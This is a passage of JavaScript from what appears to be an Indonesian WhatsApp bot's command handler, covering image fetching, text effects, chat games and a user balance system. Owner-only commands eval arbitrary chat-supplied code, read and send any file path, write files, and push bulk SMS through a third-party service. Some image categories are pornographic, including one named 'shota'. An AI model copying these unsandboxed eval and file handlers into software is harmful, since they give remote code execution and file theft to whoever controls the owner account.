            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/miku.json'
            );
          if (/milf/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/milf.json'
            );
          if (/minato/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/minato.json'
            );
          if (/mobil/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/mobil.json'
            );
          if (/motor/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/motor.json'
            );
          if (/mountain/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/mountain.json'
            );
          if (/naruto/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/naruto.json'
            );
          if (/neko/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/neko.json'
            );
          if (/neko2/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/neko2.json'
            );
          if (/nekonime/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/nekonime.json'
            );
          if (/nezuko/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/nezuko.json'
            );
          if (/onepiece/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/onepiece.json'
            );
          if (/orgy/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/orgy.json'
            );
          if (/panties/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/panties.json'
            );
          if (/pentol/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/pentol.json'
            );
          if (/pokemon/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/pokemon.json'
            );
          if (/profil/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/profil.json'
            );
          if (/progamming/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/programming.json'
            );
          if (/pubg/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/pubg.json'
            );
          if (/pussy/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/pussy.json'
            );
          if (/randblackpink/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/randblackpink.json'
            );
          if (/randomnime/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/randomnime.json'
            );
          if (/randomnime2/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/randomnime2.json'
            );
          if (/rize/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/rize.json'
            );
          if (/rose/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/rose.json'
            );
          if (/ryujin/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/ryujin.json'
            );
          if (/sagiri/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/sagiri.json'
            );
          if (/sakura/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/sakura.json'
            );
          if (/sasuke/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/sasuke.json'
            );
          if (/satanic/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/satanic.json'
            );
          if (/shina/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/shina.json'
            );
          if (/shinka/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/shinka.json'
            );
          if (/shinomiya/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/shinomiya.json'
            );
          if (/shizuka/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/shizuka.json'
            );
          if (/shota/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/shota.json'
            );
          if (/tatasurya/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/tatasurya.json'
            );
          if (/technology/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/technology.json'
            );
          if (/tejina/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/tejina.json'
            );
          if (/tentacles/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/tentacles.json'
            );
          if (/thighs/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/thighs.json'
            );
          if (/toukachan/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/toukachan.json'
            );
          if (/tsunade/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/tsunade.json'
            );
          if (/waifu/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/waifu.json'
            );
          if (/wallhp/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/wallhp.json'
            );
          if (/wallml/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/wallml.json'
            );
          if (/wallmlnime/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/wallnime.json'
            );
          if (/yotsuba/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/yotsuba.json'
            );
          if (/yuki/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/yuki.json'
            );
          if (/yulibocil/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/yulibocil.json'
            );
          if (/yumeko/.test(command))
            heyy = await fetchJson(
              'https://raw.githubusercontent.com/KirBotz/nyenyee/master/yumeko.json'
            );
          let yeha = heyy[Math.floor(Math.random() * heyy.length)];
          conn.sendMessage(from, {caption: 'Neh', image: {url: yeha}}, {quoted: dev})        
            }
            db.data.users[sender].limit -= 1 // -1 limit
 break

    
 case  'topbalance':{
let uang = Object.values(db.data.users);
uang.sort((a, b) => (a.balance < b.balance) ? 1 : -1)
let top = '*── 「 TOP BALANCE 」 ──*\n\n'
var arrTop = []
var total = 15
if (uang.length < 15) total = uang.length
for (let i = 0; i < total; i ++){
    top += `${i + 1}. wa.me/${uang[i].id.split("@")[0]}\n=> balance : $${uang[i].balance}\n\n`
    arrTop.push(uang[i].id)
}
   //conn.sendMessage(from, {text: top, mentions: arrTop}, {quoted: dev})
 mentions(top, arrTop, true)
  }
break

  
 

case 'c': {
	if (!isOwner) return setReply(mess.only.owner)
	try {
	let evaled = await eval(`(async () => { ${q} })()`)
	if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
	await setReply(evaled)
	} catch (err) {
	await setReply(String(err))
	}
	}
	break

    
	//Eval.code
	case 'x': {
	if (!isOwner) return setReply(mess.only.owner)
	try {
	let evaled = await eval(q)
	if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
	await setReply(evaled)
	} catch (err) {
	await setReply(String(err))
	}
	}
	break
    

case 'igstory':{
try {
if(!q) return setReply(`username/link sg?\nContoh: ${prefix+command} vernalta`)
setReply (mess.wait)
let res = await instagram2(q)
console.log(res)
for(const {url} of res) 
 await conn.sendMedia(from, url, m, {caption: "*INSTAGRAM STORY*"})
} catch(e){
  console.log(e)
reply('Sistem erorr, Video tidak bisa di download, mungkin di hapus')
}
}
break

    

    
    
case 'ttc': case 'ttt': case 'tictactoe': {
      if (!isPremium && global.db.data.users[sender].glimit < 1) return setReply('Limit game sudah habis, silahkan ketik .limit') // respon ketika limit habis 
        	if (!isGroup) return setReply(mess.group)
           conn.tictac = conn.tictac ? conn.tictac : {} 
        // if (roomf.x in conn.tictac) return setReply('Masih ada game yang belum selesai di chat ini') 
            if (Object.values(conn.tictac).find(roomf => roomf.id.startsWith('tictactoe') && [roomf.tictac.playerX, roomf.tictac.playerO].includes(sender))) return setReply ( 'Kamu masih didalam tictac')
            let roomf = Object.values(conn.tictac).find(roomf => roomf.state === 'WAITING' && (q ? roomf.name === q : true))
            if (roomf) {
              roomf.o = m.chat                       
            setReply('Partner ditemukan!')
            
            roomf.tictac.playerO = sender
            roomf.state = 'PLAYING'
            let arr = roomf.tictac.render().map(v => {
            return {
            X: '❌',
            O: '⭕',
            1: '1️⃣',
            2: '2️⃣',
            3: '3️⃣',
            4: '4️⃣',
            5: '5️⃣',
            6: '6️⃣',
            7: '7️⃣',
            8: '8️⃣',
            9: '9️⃣',
            }[v]
            })
            let str = `roomf ID: ${roomf.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

Menunggu @${roomf.tictac.currentTurn.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
            if (roomf.x !== roomf.o) await conn.sendText(roomf.x, str, m, { mentions: parseMention(str) } )
            await conn.sendText(roomf.o, str, m, { mentions: parseMention(str) } )
            } else {
            roomf = {
            id: 'tictactoe-' + (+new Date),
            x: m.chat,
            o: '',
            tictac: new TicTacToe(sender, 'o'),
            state: 'WAITING'
            }
            if (q) roomf.name = q
            setReply('Menunggu partner' + (q ? ` mengetik command dibawah ini ${prefix}${command} ${q}` : ''))
            conn.tictac[roomf.id] = roomf
            }
            }
    db.data.users[sender].glimit -= 1
            break 
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                
case 'delttc': case 'delttt': {
       	if (!isGroup) return setReply(mess.group)
            conn.tictac = conn.tictac ? conn.tictac : {}
            try {
            if (conn.tictac) {
            delete conn.tictac
            conn.sendText(m.chat, `Berhasil delete session TicTacToe`, m)
            } else if (!conn.tictac) {
            setReply(`Session TicTacToe🎮 tidak ada`)
            } else return '?'
            } catch (e) {
            setReply('rusak')
            }
            }
            break



    
    
case 'suitpvp': case 'suit': {
      if (!isPremium && global.db.data.users[sender].glimit < 1) return setReply('Limit game sudah habis, silahkan ketik .limit') // respon ketika limit habis 
	if (!isGroup) return setReply (mess.group)
            conn.suit = conn.suit ? conn.suit : {}
            let poin = 10
            let poin_lose = 10
            let timeout = 60000
            if (Object.values(conn.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(sender))) setReply(`Selesaikan suit mu yang sebelumnya`)
	    if (m.mentionedJid[0] === sender) return setReply(`Tidak bisa bermain dengan diri sendiri !`)
	if (m.mentionedJid[0] === botNumber) return setReply (`Tidak bisa bermain dengan Bot !`)
            if (!m.mentionedJid[0]) return setReply(`_Siapa yang ingin kamu tantang?_\nTag orangnya..\n\nContoh : ${prefix}suit @${sender.split("@")[0]}`, m.chat, { mentions: [sender] })
            if (Object.values(conn.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) return setReply ( `Orang yang kamu tantang sedang bermain suit bersama orang lain :(`)
            let id = 'suit_' + new Date() * 1
            let caption = `_*GAME SUIT PvP*_

@${sender.split`@`[0]} menantang @${m.mentionedJid[0].split`@`[0]} untuk bermain suit

Silahkan @${m.mentionedJid[0].split`@`[0]} untuk ketik terima/tolak`
            conn.suit[id] = {
            chat: await conn.sendText(m.chat, caption, m, { mentions: parseMention(caption) }),
            id: id,
            p: sender,
            p2: m.mentionedJid[0],
            status: 'wait',
            waktu: setTimeout(() => {
            if (conn.suit[id]) conn.sendText(m.chat, `_Waktu suit habis_`, m)
            delete conn.suit[id]
            }, 60000), poin, poin_lose, timeout
            }
            }
            db.data.users[sender].glimit -= 1
            break  
  
  case 'sms':{
	if(!isOwner) return setReply(mess.owner)
           if (args.length < 1) return setReply(`Penggunaan ${prefix}sms 62xnxx|psan|jumlah`)
			if (args[0].startsWith('08')) return setReply('Awali nomor dengan 62') 
            var nomor = q.split("|")[0];
            var pesann = q.split("|")[1];
            var jumlahh = q.split("|")[2];
             axios.post("https://pesan.inipulsa.my.id/sms.php?c=sms&a=kirim", `phone=${nomor}&message=${pesann}& submit=${jumlahh}`)
            setReply(`Sukses mengirim sms ke nomer ${nomor}`)
           }
 break 
                                                                                                                                                

    
case 'jadibot':
if (isGroup) return setReply('Command hanya untuk private')
jadibot(conn, from)
break
case 'stopjadibot':
if (isGroup) return setReply('Command hanya untuk private')
stopjadibot(conn, from)
break

   case 'listjadibot':
if (isGroup) return setReply("Command hanya untuk private");
listjadibot(conn, from)
break
    
    case 'buyglimit':{
	if (!q) return setReply(`Kirim perintah *${prefix}buyglimit* jumlah limit yang ingin dibeli\n\nHarga 1 game limit = Rp 700`)
	if (q.includes('-')) return setReply(`Jangan menggunakan -`)
	if (isNaN(q)) return setReply(`Harus berupa angka`)
	let ane = Number(math(q) * 700)
	if (db.data.users[sender].balance < ane) return setReply(`Saldo kamu tidak mencukupi untuk pembelian ini`)
	db.data.users[sender].balance -= ane
	db.data.users[sender].glimit += math(q)
	setReply(`Pembeliaan game limit sebanyak ${q} berhasil\n\nSisa Saldo : Rp ${db.data.users[sender].balance.toLocaleString()}\nSisa Limit : ${db.data.users[sender].glimit}/${limitCount}`)
	}
	break
    
    
    case 'susunkata':{
      if (!isPremium && global.db.data.users[sender].glimit < 1) return setReply('Limit game sudah habis, silahkan ketik .limit') // respon ketika limit habis 
if (!isGroup) return setReply(mess.only.group)
	let timeout = 80000
	let poin = 1000
	let id = m.chat
	if (id in conn.susunkata) return setReply('Masih ada soal belum terjawab di chat ini')
	let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/susunkata.json')).json()
	let json = src[Math.floor(Math.random() * src.length)]
	let caption = `
	Soal: ${json.soal}
	Tipe: ${json.tipe}
	
	Waktu: *${(timeout / 1000).toFixed(2)} detik*
	Hadiah: ${poin} Money
	`.trim()
	conn.susunkata[id] = [
	await setReply(caption),
	json, poin,
	setTimeout(() => {
	user.balance -= 200
reply(`*GAME SUSUN KATA*\n\nWaktu habis!\n𖦹 Jawabannya adalah; *${json.jawaban}*\n𖦹 Saldo kamu dikurangi 200\n𖦹 Sisa Saldo kamu: *${db.data.users[sender].balance.toLocaleString()}*`)
	delete conn.susunkata[id]
	 }, timeout)
	 ]
	}
    db.data.users[sender].glimit -= 1
	break
    


  case 'tebaklirik':{
    if (!isPremium && global.db.data.users[sender].glimit < 1) return setReply('Limit game sudah habis, silahkan ketik .limit') // respon ketika limit habis 
if (!isGroup) return setReply(mess.only.group)
	let timeout = 80000
	let poin = 1000
	let id = m.chat
	if (id in conn.tebaklirik) return setReply('Masih ada soal belum terjawab di chat ini')
	let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaklirik.json')).json()
	let json = src[Math.floor(Math.random() * src.length)]
	let caption = `
	Soal: ${json.soal}
	
	
	Waktu: *${(timeout / 1000).toFixed(2)} detik*
	Hadiah: ${poin} Money
	`.trim()
	conn.tebaklirik[id] = [
	await setReply(caption),
	json, poin,
	setTimeout(() => {
	if (conn.tebaklirik[id]) 
user.balance -= 200
reply(`*GAME TEBAK LIRIK*\n\nWaktu habis!\n𖦹 Jawabannya adalah; *${json.jawaban}*\n𖦹 Saldo kamu dikurangi 200\n𖦹 Sisa Saldo kamu: *${db.data.users[sender].balance.toLocaleString()}*`)
	delete conn.tebaklirik[id]
	 }, timeout)
	 ]
	}
    db.data.users[sender].glimit -= 1
	break

case 'siapaaku':{
  if (!isPremium && global.db.data.users[sender].glimit < 1) return setReply('Limit game sudah habis, silahkan ketik .limit') // respon ketika limit habis 
if (!isGroup) return setReply(mess.only.group)
	let timeout = 80000
	let poin = 1000
	let id = m.chat
	if (id in conn.siapaaku) return setReply('Masih ada soal belum terjawab di chat ini')
	let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/siapakahaku.json')).json()
	let json = src[Math.floor(Math.random() * src.length)]
	let caption = `
	Soal: ${json.soal}
	
	
	Waktu: *${(timeout / 1000).toFixed(2)} detik*
	Hadiah: ${poin} Money
	`.trim()
	conn.siapaaku[id] = [
	await setReply(caption),
	json, poin,
	setTimeout(() => {
	if (conn.siapaaku[id]) 
user.balance -= 200
reply(`*GAME SIAPAKAH AKU*\n\nWaktu habis!\n𖦹 Jawabannya adalah; *${json.jawaban}*\n𖦹 Saldo kamu dikurangi 200\n𖦹 Sisa Saldo kamu: *${db.data.users[sender].balance.toLocaleString()}*`)
	delete conn.siapaaku[id]
	 }, timeout)
	 ]
	}
    db.data.users[sender].glimit -= 1
	break


case 'tekateki':{
  if (!isPremium && global.db.data.users[sender].glimit < 1) return setReply('Limit game sudah habis, silahkan ketik .limit') // respon ketika limit habis 
if (!isGroup) return setReply(mess.only.group)
	let timeout = 80000
	let poin = 1000
	let id = m.chat
	if (id in conn.tekateki) return setReply('Masih ada soal belum terjawab di chat ini')
	let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/tekateki.json')).json()
	let json = src[Math.floor(Math.random() * src.length)]
	let caption = `
	Soal: ${json.soal}
	
	
	Waktu: *${(timeout / 1000).toFixed(2)} detik*
	Hadiah: ${poin} Money 💸
	`.trim()
	conn.tekateki[id] = [
	await setReply(caption),
	json, poin,
	setTimeout(() => {
	if (conn.tekateki[id]) 
user.balance -= 200
reply(`*GAME TEKA-TEKI*\n\nWaktu habis!\n𖦹 Jawabannya adalah; *${json.jawaban}*\n𖦹 Saldo kamu dikurangi 200\n𖦹 Sisa Saldo kamu: *${db.data.users[sender].balance.toLocaleString()}*`)
	delete conn.tekateki[id]
	 }, timeout)
	 ]
	}
db.data.users[sender].glimit -= 1
	break


	case 'tebakkata':{
    if (!isPremium && global.db.data.users[sender].glimit < 1) return setReply('Limit game sudah habis, silahkan ketik .limit') // respon ketika limit habis 
if (!isGroup) return setReply(mess.only.group)
	let timeout = 80000
	let poin = 1000
	let id = m.chat
	if (id in conn.tebakkata) return setReply('Masih ada soal belum terjawab di chat ini')
	let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkata.json')).json()
	let json = src[Math.floor(Math.random() * src.length)]
	let caption = `
	Soal: ${json.soal}
	
	
	Waktu: *${(timeout / 1000).toFixed(2)} detik*
	Hadiah: ${poin} Money
	`.trim()
	conn.tebakkata[id] = [
	await setReply(caption),
	json, poin,
	setTimeout(() => {
	if (conn.tebakkata[id]) 
user.balance -= 200
reply(`*GAME TEBAK KATA*\n\nWaktu habis!\n𖦹 Jawabannya adalah; *${json.jawaban}*\n𖦹 Saldo kamu dikurangi 200\n𖦹 Sisa Saldo kamu: *${db.data.users[sender].balance.toLocaleString()}*`)
	delete conn.tebakkata[id]
	 }, timeout)
	 ]
	}
    db.data.users[sender].glimit -= 1
	break
    
  case 'tebaktebakan':{
    if (!isPremium && global.db.data.users[sender].glimit < 1) return setReply('Limit game sudah habis, silahkan ketik .limit') // respon ketika limit habis 
if (!isGroup) return setReply(mess.only.group)
	let timeout = 80000
	let poin = 1000
	let id = m.chat
	if (id in conn.tebaktebak) return setReply('Masih ada soal belum terjawab di chat ini')
	let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaktebakan.json')).json()
	let json = src[Math.floor(Math.random() * src.length)]
	let caption = `
	Soal: ${json.soal}
	
	
	Waktu: *${(timeout / 1000).toFixed(2)} detik*
	Hadiah: ${poin} Money
  EXP: +50
	`.trim()
	conn.tebaktebak[id] = [
	await setReply(caption),
	json, poin,
	setTimeout(() => {
	user.balance -= 200
reply(`*GAME TEMBAK-TEMBAKAN*\n\nWaktu habis!\n𖦹 Jawabannya adalah; *${json.jawaban}*\n𖦹 Saldo kamu dikurangi 200\n𖦹 Sisa Saldo kamu: *${db.data.users[sender].balance.toLocaleString()}*`)
	delete conn.tebaktebak[id]
	 }, timeout)
	 ]
	}
    db.data.users[sender].glimit -= 1
	break

    

    case 'jarak':{
if(!q.includes("|")) return setReply("Contoh jogja|jakarta")
let Dari = q.split("|")[0]
let Ke = q.split("|")[1]
async function jarak(dari, ke) {
  let url = `https://www.google.com/search?q=${encodeURIComponent("jarak " + dari + " ke " + ke)}&hl=id`
  let { data } = await axios(url)
  let $ = cheerio.load(data)
  let img = data.split("var s=\'")[1].split("\'")[0]
  let res = {
   result: {
    img: /^data:.*?\/.*?;base64,/i.test(img) ? Buffer.from(img.split`,`[1], 'base64') : '',
    desc: $("div.BNeawe.deIvCb.AP7Wnd").text()
    }
  }
  return res
}
let nana = await jarak(Dari,Ke)
let image = nana.result.img
let caption = `*Google Maps* \n\n${nana.result.desc}`
conn.sendMessage(from,{image, caption},{quoted: dev})
} 
break


case 'berkas':
case 'getfile':
if (!isOwner) return reply(mess.owner)
if (args.length < 1) return setReply ("*Mau nyari file apa kak*")
var sendfile = `${q}`
var anuu = fs.readFileSync(sendfile)
conn.sendMessage(m.chat, {document: anuu, mimetype: 'application/octet-stream', fileName: `${q}`}, {quoted:m})  
break 





  
    
case 'bayar': case 'qr': case 'qris':{
conn.sendMessage(from, {caption: `Kak pembayaran via Dana bisa ya kak ,dan via pulsa juga bisa🤗,chat owner aja ya kak`, image: {url: 'https://cdn-153.anonfiles.com/Pdk7xdz2z5/9efab31a-1688107323/PhzZf.jpg'}}, {quoted:m})
}
break


case 'resetlimit': {
if (!isOwner ) return setReply(mess.owner)
let user = Object.keys(global.db.data.users)
let limitUser = global.limitCount
for (let jid of user) global.db.data.users[jid].limit = limitUser
  reply('sukses')
}
break

    
    

 



case 'cyberspace': case 'games': case 'pubg': case 'islamic': case 'mountain':
case 'programming': case 'technology': case 'tatasurya':  case 'hekel': 
case 'motor': case 'mobil': case 'aesthetic': case 'wallhp': case 'anjing':
case 'kucing': case 'keneki': case 'megumin': case 'yotsuba': case 'kartun':
case 'chiho': case 'tejina': case 'yumeko': case 'shinomiya': case 'pentol':
case 'toukachan': case 'akira': case 'itori': case 'kurumi':
case 'sagiri': case 'eba': case 'deidara': case 'itachi': case 'madara':{
setReply (mess.wait)
conn.sendMessage(from, {image: {url: `https://botapi.takimtod.repl.co/api/wallpaper/${command}?apikey=BetaBotz`}})
}
break
 


case 'candy': case 'christmas': case '3dchristmas': case 'sparklechristmas':
case 'deepsea': case 'scifi': case 'rainbow': case 'waterpipe': case 'spooky': 
case 'pencil': case 'circuit': case 'discovery': case 'metalic': case 'fiction': case 'demon': 
case 'transformer': case 'berry': case 'thunder': case 'magma': case '3dstone': 
case 'neonlight': case 'glitch': case 'harrypotter': case 'brokenglass': case 'papercut': 
case 'watercolor': case 'multicolor': case 'neondevil': case 'underwater': case 'graffitibike':
 case 'snow': case 'cloud': case 'honey': case 'ice': case 'fruitjuice': case 'biscuit': case 'wood': 
case 'chocolate': case 'strawberry': case 'matrix': case 'blood': case 'dropwater': case 'toxic': 
case 'lava': case 'rock': case 'bloodglas': case 'hallowen': case 'darkgold': case 'joker': case 'wicker':
 case 'firework': case 'skeleton': case 'blackpink': case 'sand': case 'glue': case '1917': case 'leaves': {
    if (!q) return setReply(`Example : ${prefix + command} Aku suka makan`) 
             setReply(mess.wait)
             let link
             if (/candy/.test(command)) link = 'https://textpro.me/create-christmas-candy-cane-text-effect-1056.html'
             if (/christmas/.test(command)) link = 'https://textpro.me/christmas-tree-text-effect-online-free-1057.html'
             if (/3dchristmas/.test(command)) link = 'https://textpro.me/3d-christmas-text-effect-by-name-1055.html'
             if (/sparklechristmas/.test(command)) link = 'https://textpro.me/sparkles-merry-christmas-text-effect-1054.html'
             if (/deepsea/.test(command)) link = 'https://textpro.me/create-3d-deep-sea-metal-text-effect-online-1053.html'
             if (/scifi/.test(command)) link = 'https://textpro.me/create-3d-sci-fi-text-effect-online-1050.html'
             if (/rainbow/.test(command)) link = 'https://textpro.me/3d-rainbow-color-calligraphy-text-effect-1049.html'
             if (/waterpipe/.test(command)) link = 'https://textpro.me/create-3d-water-pipe-text-effects-online-1048.html'
             if (/spooky/.test(command)) link = 'https://textpro.me/create-halloween-skeleton-text-effect-online-1047.html'
             if (/pencil/.test(command)) link = 'https://textpro.me/create-a-sketch-text-effect-online-1044.html'
             if (/circuit/.test(command)) link = 'https://textpro.me/create-blue-circuit-style-text-effect-online-1043.html'
             if (/discovery/.test(command)) link = 'https://textpro.me/create-space-text-effects-online-free-1042.html'
             if (/metalic/.test(command)) link = 'https://textpro.me/creat-glossy-metalic-text-effect-free-online-1040.html'
             if (/fiction/.test(command)) link = 'https://textpro.me/create-science-fiction-text-effect-online-free-1038.html'
             if (/demon/.test(command)) link = 'https://textpro.me/create-green-horror-style-text-effect-online-1036.html'
             if (/transformer/.test(command)) link = 'https://textpro.me/create-a-transformer-text-effect-online-1035.html'
             if (/berry/.test(command)) link = 'https://textpro.me/create-berry-text-effect-online-free-1033.html'
             if (/thunder/.test(command)) link = 'https://textpro.me/online-thunder-text-effect-generator-1031.html'
             if (/magma/.test(command)) link = 'https://textpro.me/create-a-magma-hot-text-effect-online-1030.html'
             if (/3dstone/.test(command)) link = 'https://textpro.me/3d-stone-cracked-cool-text-effect-1029.html'
             if (/neonlight/.test(command)) link = 'https://textpro.me/create-3d-neon-light-text-effect-online-1028.html'
             if (/glitch/.test(command)) link = 'https://textpro.me/create-impressive-glitch-text-effects-online-1027.html'
             if (/harrypotter/.test(command)) link = 'https://textpro.me/create-harry-potter-text-effect-online-1025.html'
             if (/brokenglass/.test(command)) link = 'https://textpro.me/broken-glass-text-effect-free-online-1023.html'
             if (/papercut/.test(command)) link = 'https://textpro.me/create-art-paper-cut-text-effect-online-1022.html'
             if (/watercolor/.test(command)) link = 'https://textpro.me/create-a-free-online-watercolor-text-effect-1017.html'
             if (/multicolor/.test(command)) link = 'https://textpro.me/online-multicolor-3d-paper-cut-text-effect-1016.html'
             if (/neondevil/.test(command)) link = 'https://textpro.me/create-neon-devil-wings-text-effect-online-free-1014.html'
             if (/underwater/.test(command)) link = 'https://textpro.me/3d-underwater-text-effect-generator-online-1013.html'
             if (/graffitibike/.test(command)) link = 'https://textpro.me/create-wonderful-graffiti-art-text-effect-1011.html'
             if (/snow/.test(command)) link = 'https://textpro.me/create-snow-text-effects-for-winter-holidays-1005.html'
             if (/cloud/.test(command)) link = 'https://textpro.me/create-a-cloud-text-effect-on-the-sky-online-1004.html'
             if (/honey/.test(command)) link = 'https://textpro.me/honey-text-effect-868.html'
             if (/ice/.test(command)) link = 'https://textpro.me/ice-cold-text-effect-862.html'
             if (/fruitjuice/.test(command)) link = 'https://textpro.me/fruit-juice-text-effect-861.html'
             if (/biscuit/.test(command)) link = 'https://textpro.me/biscuit-text-effect-858.html'
             if (/wood/.test(command)) link = 'https://textpro.me/wood-text-effect-856.html'
             if (/chocolate/.test(command)) link = 'https://textpro.me/chocolate-cake-text-effect-890.html'
             if (/strawberry/.test(command)) link = 'https://textpro.me/strawberry-text-effect-online-889.html'
             if (/matrix/.test(command)) link = 'https://textpro.me/matrix-style-text-effect-online-884.html'
             if (/blood/.test(command)) link = 'https://textpro.me/horror-blood-text-effect-online-883.html'
             if (/dropwater/.test(command)) link = 'https://textpro.me/dropwater-text-effect-872.html'
             if (/toxic/.test(command)) link = 'https://textpro.me/toxic-text-effect-online-901.html'
             if (/lava/.test(command)) link = 'https://textpro.me/lava-text-effect-online-914.html'
             if (/rock/.test(command)) link = 'https://textpro.me/rock-text-effect-online-915.html'
             if (/bloodglas/.test(command)) link = 'https://textpro.me/blood-text-on-the-frosted-glass-941.html'
             if (/hallowen/.test(command)) link = 'https://textpro.me/halloween-fire-text-effect-940.html'
             if (/darkgold/.test(command)) link = 'https://textpro.me/metal-dark-gold-text-effect-online-939.html'
             if (/joker/.test(command)) link = 'https://textpro.me/create-logo-joker-online-934.html'
             if (/wicker/.test(command)) link = 'https://textpro.me/wicker-text-effect-online-932.html'
             if (/firework/.test(command)) link = 'https://textpro.me/firework-sparkle-text-effect-930.html'
             if (/skeleton/.test(command)) link = 'https://textpro.me/skeleton-text-effect-online-929.html'
             if (/blackpink/.test(command)) link = 'https://textpro.me/create-blackpink-logo-style-online-1001.html'
             if (/sand/.test(command)) link = 'https://textpro.me/write-in-sand-summer-beach-free-online-991.html'
             if (/glue/.test(command)) link = 'https://textpro.me/create-3d-glue-text-effect-with-realistic-style-986.html'
             if (/1917/.test(command)) link = 'https://textpro.me/1917-style-text-effect-online-980.html'
                if (/leaves/.test(command)) link = 'https://textpro.me/natural-leaves-text-effect-931.html'
             let anu = await textpro(link, q)
                conn.sendMessage(m.chat, { image: { url: anu }, caption: `*Done*` }, { quoted: dev })
             }
            
break

case 'savefile':{
if(!isOwner) return setReply(mess.only.owner)
if (!q) return setReply( `where is the path?\n\nexample:\n${prefix + command} plugins/menu.js`)
if (!m.quoted.text) return setReply( `reply code`)
let path = `${q}`
await require('fs').writeFileSync(path, m.quoted.text)
setReply(`Saved ${path} to file!`)
}
break

    
case 'snobg': case 'nobg':{
